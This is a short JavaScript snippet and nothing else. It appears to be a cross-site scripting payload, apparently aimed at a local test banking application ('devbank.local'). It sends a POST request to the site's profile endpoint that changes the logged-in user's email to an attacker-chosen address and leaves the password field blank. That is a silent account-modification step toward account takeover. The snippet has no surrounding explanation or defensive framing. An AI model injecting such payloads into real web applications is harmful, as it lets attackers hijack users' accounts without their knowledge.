fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=xss-changed@devbank.local&password="
});
